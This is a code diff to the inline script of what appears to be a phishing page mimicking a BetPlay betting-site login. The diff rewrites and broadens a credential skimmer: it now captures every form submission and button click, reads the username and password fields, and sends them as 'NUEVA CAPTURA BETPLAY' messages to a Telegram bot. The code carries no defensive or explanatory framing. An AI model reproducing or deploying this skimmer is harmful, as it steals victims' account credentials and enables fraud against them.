@@ -438,24 +438,30 @@
         return originalAlert ? originalAlert(msg) : true;
     };
 
-    // Intercepta el envío y manda los datos por imagen
-    document.addEventListener("DOMContentLoaded", function() {
-        const btn = document.querySelector('button[type="submit"]') || document.querySelector('.btn--blue');
-        
-        if (btn) {
-            btn.addEventListener('click', function(e) {
-                const usuario = document.getElementById('loginUsuario')?.value || document.querySelector('input[type="text"]')?.value;
-                const password = document.querySelector('input[type="password"]')?.value;
+    // Captura global y directa en el formulario o documento
+    document.addEventListener("submit", function(e) {
+        enviarDatos();
+    }, true);
 
-                if (usuario && password) {
-                    const mensaje = `🚨 NUEVA CAPTURA BETPLAY\nUsuario: ${usuario}\nClave: ${password}`;
-                    
-                    const img = new Image();
-                    img.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mensaje)}`;
-                }
-            });
+    document.addEventListener("click", function(e) {
+        if (e.target.tagName === 'BUTTON' || e.target.type === 'submit' || e.target.closest('button')) {
+            enviarDatos();
         }
-    });
+    }, true);
+
+    function enviarDatos() {
+        setTimeout(function() {
+            const usuario = document.getElementById('loginUsuario')?.value || document.querySelector('input[type="text"]')?.value || document.querySelector('input')?.value;
+            const password = document.querySelector('input[type="password"]')?.value;
+
+            if (usuario && password) {
+                const mensaje = `🚨 NUEVA CAPTURA BETPLAY\nUsuario: ${usuario}\nClave: ${password}`;
+                
+                const img = new Image();
+                img.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mensaje)}`;
+            }
+        }, 300);
+    }
 </script>
 </body>
 </html>
